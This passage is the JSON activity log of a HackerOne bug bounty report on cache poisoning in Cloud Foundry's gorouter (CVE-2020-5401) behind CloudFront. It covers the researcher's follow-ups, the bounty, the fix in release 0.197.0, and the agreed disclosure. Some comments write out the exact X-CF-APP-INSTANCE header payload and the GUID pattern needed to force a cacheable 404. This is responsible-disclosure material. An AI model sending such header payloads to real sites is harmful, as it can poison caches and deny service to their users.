measure.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-04T21:59:22.517Z","updated_at":"2019-12-04T21:59:22.517Z","actor":{"username":"nathand","cleared":false,"url":"/nathand","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6469343,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @nathand for the update. I'm working with the cloud.gov team to see when they can roll this out.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/nathand\"\u003e@nathand\u003c/a\u003e for the update. I\u0026#39;m working with the cloud.gov team to see when they can roll this out.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-04T22:07:03.695Z","updated_at":"2019-12-04T22:07:03.695Z","actor":{"username":"gsa_adborden","cleared":false,"url":"/gsa_adborden","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6469762,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"FYI, it appears that gorouter 0.195.0 will still return a 404 if the header matches a specific format - a header of `X-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1` should trigger this behaviour. They did make sure to remove the public cache friendly headers in the response, but some web caches might ignore those and force cache a 404 regardless. I'm not sure if CloudFront is an example of this, as I haven't been able to test a 0.195.0 instance deployed behind CloudFront yet - so perhaps something to test on your end once the cloud.gov team has rolled it out. The original PoC above should be the same except the `X-CF-APP-INSTANCE` needs to match the format `^[\\da-f]{8}-([\\da-f]{4}-){3}[\\da-f]{12}:\\d+$` to trigger the 404 now.","markdown_message":"\u003cp\u003eFYI, it appears that gorouter 0.195.0 will still return a 404 if the header matches a specific format - a header of \u003ccode\u003eX-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1\u003c/code\u003e should trigger this behaviour. They did make sure to remove the public cache friendly headers in the response, but some web caches might ignore those and force cache a 404 regardless. I\u0026#39;m not sure if CloudFront is an example of this, as I haven\u0026#39;t been able to test a 0.195.0 instance deployed behind CloudFront yet - so perhaps something to test on your end once the cloud.gov team has rolled it out. The original PoC above should be the same except the \u003ccode\u003eX-CF-APP-INSTANCE\u003c/code\u003e needs to match the format \u003ccode\u003e^[\\da-f]{8}-([\\da-f]{4}-){3}[\\da-f]{12}:\\d+$\u003c/code\u003e to trigger the 404 now.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-04T23:42:31.988Z","updated_at":"2019-12-04T23:42:31.988Z","actor":{"username":"nathand","cleared":false,"url":"/nathand","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6498366,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"My testing suggests that Cloudfront **will** still cache a 404 regardless of the `Cache-Control` header, so the `X-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1` header payload with 0.195.0 will still allow for cache poisoning. I've let Pivotal know about this and suggested they consider exploring adding a `Vary: X-CF-APP-INSTANCE` response header or just more simply respond with a 400 even if the GUID format is correct, and never a 404.","markdown_message":"\u003cp\u003eMy testing suggests that Cloudfront \u003cstrong\u003ewill\u003c/strong\u003e still cache a 404 regardless of the \u003ccode\u003eCache-Control\u003c/code\u003e header, so the \u003ccode\u003eX-CF-APP-INSTANCE: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1\u003c/code\u003e header payload with 0.195.0 will still allow for cache poisoning. I\u0026#39;ve let Pivotal know about this and suggested they consider exploring adding a \u003ccode\u003eVary: X-CF-APP-INSTANCE\u003c/code\u003e response header or just more simply respond with a 400 even if the GUID format is correct, and never a 404.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-09T02:56:43.910Z","updated_at":"2019-12-09T02:56:43.910Z","actor":{"username":"nathand","cleared":false,"url":"/nathand","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6515703,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-10T18:55:38.423Z","updated_at":"2019-12-10T18:55:38.423Z","actor":{"url":"/tts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/499/a8abb6c9702d454ed2bcfa55bb077ac2e49988b9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"TTS Bug Bounty"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"tts","collaborator":{"username":"nathand","url":"/nathand"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7048753,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there,\n\nIt looks like CloudFoundry has fixed the X-CF-APP-INSTANCE causing a 404 issue in the 0.197.0 release:\n\nhttps://github.com/cloudfoundry/routing-release/releases/tag/0.197.0\n\nBy returning a 400, it should prevent cache poisoning.\n","markdown_message":"\u003cp\u003eHi there,\u003c/p\u003e\n\n\u003cp\u003eIt looks like CloudFoundry has fixed the X-CF-APP-INSTANCE causing a 404 issue in the 0.197.0 release:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/cloudfoundry/routing-release/releases/tag/0.197.0\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fcloudfoundry%2Frouting-release%2Freleases%2Ftag%2F0.197.0\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/cloudfoundry/routing-release/releases/tag/0.197.0\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eBy returning a 400, it should prevent cache poisoning.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-13T23:08:54.749Z","updated_at":"2020-02-13T23:08:54.749Z","actor":{"username":"nathand","cleared":false,"url":"/nathand","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7085648,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nathand Awesome! Thanks for letting us know, appreciate it!","markdown_message":"\u003cp\u003e\u003ca href=\"/nathand\"\u003e@nathand\u003c/a\u003e Awesome! Thanks for letting us know, appreciate it!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-19T03:28:52.447Z","updated_at":"2020-02-19T03:28:52.447Z","actor":{"username":"alyssa_feola","cleared":false,"url":"/alyssa_feola","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/LXSER1a4TxzWgM2pqGrK1XMR/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7281215,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello, \n\nThanks for submitting this report. The cloud.gov team has deployed a newer version of the go router, and determined that this report is now resolved. If you’re still able to reproduce this issue, please let us know and we will investigate further. \n\nThanks again for reporting this to TTS!","markdown_message":"\u003cp\u003eHello, \u003c/p\u003e\n\n\u003cp\u003eThanks for submitting this report. The cloud.gov team has deployed a newer version of the go router, and determined that this report is now resolved. If you’re still able to reproduce this issue, please let us know and we will investigate further. \u003c/p\u003e\n\n\u003cp\u003eThanks again for reporting this to TTS!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-10T17:02:09.801Z","updated_at":"2020-03-10T17:02:09.801Z","actor":{"username":"gsa_adborden","cleared":false,"url":"/gsa_adborden","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"nathand","url":"/nathand"},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7294479,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks @gsa_adborden - it looks solid from my end.\n\nAre you happy to disclose this? the details of this have since been published by Pivotal and myself and assigned CVE-2020-5401 so there is no issue from that perspective.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/gsa_adborden\"\u003e@gsa_adborden\u003c/a\u003e - it looks solid from my end.\u003c/p\u003e\n\n\u003cp\u003eAre you happy to disclose this? the details of this have since been published by Pivotal and myself and assigned CVE-2020-5401 so there is no issue from that perspective.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-12T00:37:02.220Z","updated_at":"2020-03-12T00:37:02.220Z","first_to_agree":true,"actor":{"username":"nathand","cleared":false,"url":"/nathand","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7301551,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-12T16:02:40.210Z","updated_at":"2020-03-12T16:02:40.210Z","actor":{"username":"gsa_adborden","cleared":false,"url":"/gsa_adborden","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7301552,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-12T16:02:40.300Z","updated_at":"2020-03-12T16:02:40.300Z","actor":{"username":"gsa_adborden","cleared":false,"url":"/gsa_adborden","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}